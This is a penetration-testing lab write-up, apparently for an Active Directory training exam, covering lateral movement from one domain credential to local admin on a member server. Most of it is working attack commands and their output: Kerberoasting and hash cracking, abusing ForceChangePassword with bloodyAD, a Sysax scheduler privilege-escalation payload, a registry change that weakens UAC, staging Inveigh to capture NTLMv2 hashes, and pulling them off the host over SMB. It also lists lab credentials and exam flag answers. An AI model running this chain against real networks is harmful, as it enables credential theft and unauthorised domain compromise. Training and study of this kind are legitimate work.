# Section 10 — Lateral Movement

> Starting from the first domain credentials (`hporter:Gr8hambino!`) obtained on DEV01, enumerate AD with BloodHound, Kerberoast service accounts, pillage file shares for more creds, pivot to the MS01 member server, escalate to SYSTEM via a vulnerable third-party service, and capture/crack a second account's NTLMv2 hash. End state: local admin on MS01 + multiple credential sets, positioned to hunt the path to Domain Admin.

---

## Prereqs / Staging

All internal traffic routes through the rooted `dmz01` jump host. Two persistent tunnels from the attack host (opsbox):

```bash
# SOCKS proxy into the 172.16.8.0/23 internal network (for nxc/impacket/bloodhound)
ssh -i dmz01_key -D 8081 -N -f root@<dmz01_external_ip>

# proxychains4 config -> socks5 127.0.0.1 8081
```

| Host | IP | Role |
|------|-----|------|
| dmz01 | 10.129.x.x (ext) / **172.16.8.120** (int) | pivot — SSH root, file staging, internal gateway |
| DC01 | 172.16.8.3 | Domain Controller — INLANEFREIGHT.LOCAL |
| DEV01 | 172.16.8.20 | DNN web / MSSQL (already owned in §9) |
| MS01 | 172.16.8.50 | member server — WinRM + RDP open (this section's target) |

> dmz01's internal interface (172.16.8.120) is on the same `/23` as every target, so it doubles as the HTTP/file-staging host for tools that internal boxes can't pull from the internet.

---

## Step 1 — BloodHound Collection (Linux, through SOCKS)

```bash
proxychains4 -q bloodhound-python -d inlanefreight.local \
  -u hporter -p 'Gr8hambino!' -ns 172.16.8.3 -c All --zip --dns-tcp
```

> **`--dns-tcp` is mandatory through proxychains** — SOCKS doesn't carry UDP, so default UDP DNS times out. Forcing DNS over TCP routes name resolution through the proxy.

> **Collector/GUI version must match.** `bloodhound-python` (PyPI `bloodhound`) outputs **legacy** format (BloodHound 4.2/4.3) and will NOT ingest into **BloodHound CE**. For CE, install `bloodhound-ce` (`pipx install bloodhound-ce`, binary `bloodhound-ce-python`). Wrong collector = silent empty graph on import.

Transfer the zip out and import via **CE web UI → Administration → File Ingest** (BH-CE runs at `http://127.0.0.1:8080`). Mark `hporter` as **Owned**.

### Reading the graph

- `hporter` → **Outbound Object Control**: only `MemberOf → Domain Users → Authenticated Users → Everyone`. **All default nesting, zero attack edges.** A plain domain user.
- **Lesson:** a juicy account name means nothing without the group/ACL data behind it. When the foothold user is unremarkable, pivot to *domain-wide* abuse (Kerberoast, share hunting), not ACL paths.

Useful Cypher / pre-built queries:
```cypher
MATCH (u:User) WHERE u.hasspn=true RETURN u          // Kerberoastable
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u  // AS-REP roastable
```
Pre-builts worth a click: *Computers where Domain Users are local administrators*, *Principals with DCSync privileges*, *Find Shortest Paths to Domain Admins*.

---

## Step 2 — Kerberoasting

Any domain user can request a TGS for any account with an SPN, then crack it offline (no lockouts, no noise).

```bash
proxychains4 -q GetUserSPNs.py inlanefreight.local/hporter:'Gr8hambino!' \
  -dc-ip 172.16.8.3 -request -outputfile kerb_hashes.txt
```

**12 service accounts returned:** `mssqlsvc, mssqladm, svc_sql, sqlprod, sqldev, sqlqa, sqltest, sapvc, sapsso, vmwarescvc, backupjob, azureconnect`. The SPNs leak internal hostnames (e.g. `backupjob/veam001` → Veeam server).

### Crack — do it on a real GPU, NOT the droplet

```bash
# Mac (Apple Silicon GPU via Metal) — offline, touches no target = OPSEC-safe
hashcat -m 13100 kerb_hashes.txt rockyou.txt -O
hashcat -m 13100 kerb_hashes.txt --show
```

> **Cracking is pure local compute** — never sends a packet to the engagement network, so it belongs on the most powerful local box, not the network-facing pivot. The $6 droplet has no GPU and throws `Not enough allocatable device memory`; stock `john` 1.9.0 has no `krb5tgs` format. Pull the hashes to the GPU host.

**Result — 1 of 12 cracks:** `backupjob : lucky7` (others have strong/random passwords — you only need one).

> `backupjob` group check (`nxc ldap ... -M groupmembership`) → **only Domain Users**. Name implied Backup Operators / SeBackupPrivilege; the data says otherwise. Don't anchor on the name. Its real value: another valid cred + **READ on a non-default share** (next step).

---

## Step 3 — Share Hunting → backupadm Credentials

Enumerate shares with the new cred; ignore defaults (C$, IPC$, NETLOGON, SYSVOL), hunt non-default ones:

```bash
proxychains4 -q nxc smb 172.16.8.3 -u backupjob -p 'lucky7' --shares
```
→ **`Department Shares` (READ)** — custom share = where admins stash scripts/configs/creds.

The juicy file `IT\Private\Development\SQL Express Backup.ps1` is **NTFS-denied to `backupjob`**. The walkthrough's intended reader is **`ssmalls`**, reached via an ACL edge.

### ForceChangePassword abuse (Linux-native — beats the walkthrough's RDP+PowerView)

BloodHound shows `hporter` has **ForceChangePassword over ssmalls**. Reset it straight from Linux with **bloodyAD** — no RDP, no PowerView, no Windows host:

```bash
proxychains4 -q bloodyAD --host 172.16.8.3 -d inlanefreight.local \
  -u hporter -p 'Gr8hambino!' set password ssmalls 'Spr1ng2026Reset!'
```
> **Logged change for the report appendix** — resetting a real user's password is destructive; confirm with client in a real engagement.

Read the script as ssmalls:
```bash
proxychains4 -q smbclient -U 'inlanefreight.local\ssmalls%Spr1ng2026Reset!' \
  '//172.16.8.3/Department Shares' \
  -c 'cd IT\Private\Development; get "SQL Express Backup.ps1" /tmp/sqlbackup.ps1'
```
**Hardcoded creds:** `backupadm : !qazXSW@` (keyboard walk — `!qaz` + `XSW@`, down the left of the keyboard).

### Other creds found while pillaging (note as findings, mostly dead ends)

| Source | Cred | Note |
|--------|------|------|
| SYSVOL `scripts\adum.vbs` | `account:L337^p@$$w0rD` | old/stale — no `account` user in BH |
| Password spray `Welcome1` | `kdenunez`, `mmertle` | weak-password finding; no useful access |
| AD `description` field | `frontdesk:ILFreightLobby!` | finding: *Passwords in AD Description Field* |

> Each is a reportable finding (sensitive data on shares, weak passwords) even when it doesn't advance the attack.

---

## Step 4 — Pivot to MS01 (WinRM) → ilfserveradm

`backupadm` is in **Remote Management Users** on MS01 → WinRM shell (non-admin):

```bash
proxychains4 -q nxc winrm 172.16.8.50 -u backupadm -p '!qazXSW@' \
  -x "cmd /c type c:\panther\unattend.xml"
```
> `nxc winrm` `Pwn3d!` only means *shell access* here, not local admin — confirm with `whoami /groups` (backupadm = Remote Management Users + Users only).

`unattend.xml` (leftover provisioning file in `C:\panther`) contains a local autologon cred:
**`ilfserveradm : Sys26Admin`** — a **local** account, member of **Remote Desktop Users** (RDP-capable), not admin.

> **Nested-quote gotcha:** through `ssh → proxychains → nxc → cmd → powershell`, `$_`/quotes/`%` get mangled. Use commands with no special chars, the **8.3 short path** (`C:\PROGRA~2\SysaxAutomation`) to dodge spaces, or base64-encoded PowerShell.

---

## Step 5 — Privilege Escalation on MS01 (Sysax Automation → SYSTEM)

No SeImpersonate on these accounts (no potato path). The privesc is **feature abuse** of a vulnerable third-party service: **Sysax Automation Suite 6.90** ([EDB-50834](https://www.exploit-db.com/exploits/50834)). The `sysaxsched` service runs as **SYSTEM** and lets any interactive user create a task that runs in *its* context.

> Binary hijack is out — `icacls C:\PROGRA~2\SysaxAutomation\sysaxsched.exe` shows `Users:(RX)` only. The exploit is GUI-driven, so it needs an **RDP/interactive session**.

### RDP tunnel (double-hop, all localhost-bound)

```bash
# on opsbox: opsbox-local 13389 -> MS01:3389 via dmz01
ssh -i dmz01_key -L 127.0.0.1:13389:172.16.8.50:3389 -N -f root@<dmz01_ext>
# on Mac: Mac 13389 -> opsbox 13389
ssh -L 13389:127.0.0.1:13389 -N -f opsbox
# RDP client -> 127.0.0.1:13389  (user: ilfserveradm  pass: Sys26Admin, LOCAL account, no domain prefix)
```

### The exploit (in the RDP session)

1. Plant payload (ANSI encoding — use `cmd`, not PowerShell `>`, which writes UTF-16+BOM):
   ```cmd
   echo net localgroup administrators ilfserveradm /add > C:\Users\ilfserveradm\Documents\pwn.bat
   ```
2. Launch GUI: `"C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe"`
   (it spawns IE trying to reach sysax.com — ignore/close; the real control panel is behind it)
3. **Setup Scheduled/Triggered Tasks → Add task (Triggered)**
4. Task type: **Run any other Program** → `C:\Users\ilfserveradm\Documents\pwn.bat`
5. Execution options: **UNCHECK "Login as the following user to run task"** ← the crux. No user = inherits the SYSTEM service context.
6. Trigger page: **Monitored folder** = `C:\Users\ilfserveradm\Documents`, check **"Run task if a file is added…"**
7. **Save**, then **close** the Task Manager window — *the scheduler is paused while that window is open.*
8. Arm it: drop a file in the monitored folder:
   ```cmd
   echo go > C:\Users\ilfserveradm\Documents\trigger.txt
   ```
9. Verify: `net localgroup administrators` → `ilfserveradm` now listed.

> "Run task now" / past-dated *scheduled* tasks did **not** fire reliably (scheduler paused while window open). The **triggered/monitor-folder** method is the deterministic one.

### Reading the flag (UAC token filtering)

`ilfserveradm` is a **local** account → its admin token is **UAC-filtered over the network** (SMB/WinRM get a stripped token), and the *current* RDP token predates the group change. Two fixes:
- **Re-login + elevate:** sign out, reconnect, run an **elevated** PowerShell → `type C:\Users\Administrator\Desktop\flag.txt` (full token reads it directly).
- **Reuse SYSTEM task:** repoint `pwn.bat` to `type "...flag.txt" ^> "...readable\flag_out.txt"` and re-trigger.

**Q3 flag:** `33a9d46de4015e7b3b0ad592a9394720`

To enable headless admin SMB afterward (so the attack host can pull files / dump):
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```
> Now `nxc smb 172.16.8.50 -u ilfserveradm -p Sys26Admin --local-auth` returns `(Pwn3d!)`. **Log this change** — it weakens UAC remote restrictions.

---

## Step 6 — NTLMv2 Capture (mpalledorous) with Inveigh

A scheduled task on **DEV01** periodically authenticates to **MS01** over SMB as `ACADEMY-AEN-DEV\mpalledorous`. With admin on MS01, run **Inveigh** to harvest that NTLMv2.

### Stage Inveigh to MS01 (no internet on MS01)

```bash
# opsbox: grab self-contained nativeAOT build (no .NET runtime needed on target)
curl -sL -o inv.zip <github>/Inveigh/releases/download/v2.0.12/Inveigh-net10.0-win-x64-nativeaot-v2.0.12.zip
unzip inv.zip                      # -> Inveigh.exe (PE32+ native)
scp -i dmz01_key Inveigh.exe root@<dmz01_ext>:/tmp/
# serve from dmz01's INTERNAL interface (reachable by MS01); pick a free port
ssh -i dmz01_key root@<dmz01_ext> 'cd /tmp && (python3 -m http.server 8000 --bind 172.16.8.120 &)'
```
> Backgrounding through nested SSH dies on SIGHUP — wrap in `( … & )` / `setsid`, or hold it in a `tmux` session on opsbox. Watch for port clashes with docker on the pivot.

On MS01 (elevated PowerShell):
```powershell
iwr -UseBasicParsing http://172.16.8.120:8000/Inveigh.exe -OutFile C:\Users\Public\Inveigh.exe
C:\Users\Public\Inveigh.exe
```
> On a server, port 445 is held by the kernel — Inveigh **sniffs** the NTLM auth off the wire passively (it does not bind 445). Capture is near-instant when DEV01's task fires:
```
SMB(445) NTLMv2 captured for [ACADEMY-AEN-DEV\mpalledorous] from 172.16.8.20
→ written to C:\Users\Public\Inveigh-NTLMv2.txt
```

### Exfil + crack

```bash
# after LocalAccountTokenFilterPolicy=1, pull via SMB (path is C$-relative, NOT C:\)
proxychains4 -q nxc smb 172.16.8.50 -u ilfserveradm -p 'Sys26Admin' --local-auth \
  --get-file 'Users\Public\Inveigh-NTLMv2.txt' /tmp/mpall.txt
# crack on the Mac GPU
hashcat -m 5600 mpall.txt rockyou.txt -O
```
**Q4 answer:** `mpalledorous : 1squints2`

---

## What We Have Now

| Item | Value |
|------|-------|
| Domain user (start) | `hporter:Gr8hambino!` |
| Kerberoast crack | `backupjob:lucky7` |
| ssmalls (reset via ACL) | `ssmalls:Spr1ng2026Reset!` |
| Share-config cred | `backupadm:!qazXSW@` |
| MS01 local autologon | `ilfserveradm:Sys26Admin` |
| **MS01 local admin / SYSTEM** | via Sysax LPE — flag `33a9d46de4015e7b3b0ad592a9394720` |
| Cross-host cred (DEV01 acct) | `mpalledorous:1squints2` |

## Attack Chain So Far

```
hporter (domain user, from §9)
  → BloodHound: hporter has no ACLs → pivot to domain-wide abuse
  → Kerberoast 12 SPNs → crack backupjob:lucky7
  → backupjob READ on "Department Shares" (IT subfolder denied)
  → hporter ForceChangePassword → reset ssmalls (bloodyAD)
  → ssmalls reads SQL Express Backup.ps1 → backupadm:!qazXSW@
  → backupadm WinRM to MS01 → unattend.xml → ilfserveradm:Sys26Admin
  → RDP MS01 → Sysax Automation triggered task (no run-as user) → SYSTEM
  → ilfserveradm added to local admins → MS01 flag
  → Inveigh on MS01 → capture mpalledorous NTLMv2 from DEV01 → crack 1squints2
  → NEXT: feed all creds + BloodHound back in → hunt path to Domain Admin
```

## Exam Relevance

- **Kerberoasting is the default move from any plain domain user** — `GetUserSPNs.py -request`, crack `-m 13100`. Memorize it.
- **Crack offline on the strongest GPU you have** — it's network-silent; never bottleneck on a pivot box.
- **Share hunting wins when BloodHound is dry** — non-default shares (`Department Shares`, dept/IT shares, user home drives) routinely hold `web.config`, backup scripts, `.ps1` with hardcoded service creds.
- **ForceChangePassword from Linux** — `bloodyAD set password <target> <pw>` (or `net rpc password`, `pth-net`). No need to RDP + PowerView like the official path.
- **unattend.xml / sysprep / panther** — always check `C:\Windows\Panther\`, `C:\unattend.xml`, `C:\sysprep\` for plaintext/Base64 autologon creds on freshly-imaged hosts.
- **Third-party service privesc** — enumerate non-default `C:\Program Files (x86)` software, check service run-as (`sc qc` / `Get-CimInstance win32_service`) and dir ACLs (`icacls`); search Exploit-DB by product+version. Sysax = scheduler runs tasks as SYSTEM with no run-as user.
- **UAC remote token filtering** — local-admin accounts get filtered tokens over SMB/WinRM. `LocalAccountTokenFilterPolicy=1` (or use the built-in `Administrator`, which is exempt) restores full remote admin. Common "I'm admin but can't `--get-file`/psexec" gotcha.
- **Poisoning/relay payoff on receiving hosts** — admin on a box that *receives* service auths (Inveigh/Responder sniffer, no need to bind 445 on a server) harvests creds from hosts you never touched.
- **NTLMv2 crack mode is `5600`**; NetNTLMv1 is `5500`; Kerberoast `13100`; AS-REP `18200`.

## Changes Made (revert in a real engagement / log in appendix)

- Reset `ssmalls` password → `Spr1ng2026Reset!`
- Added `ilfserveradm` to local Administrators on MS01
- Set `LocalAccountTokenFilterPolicy=1` on MS01
- Left `Inveigh.exe` + `Inveigh-NTLMv2.txt` in `C:\Users\Public` on MS01
- Staged `Inveigh.exe` in `/tmp` on dmz01 + ran an HTTP server on `172.16.8.120:8000`
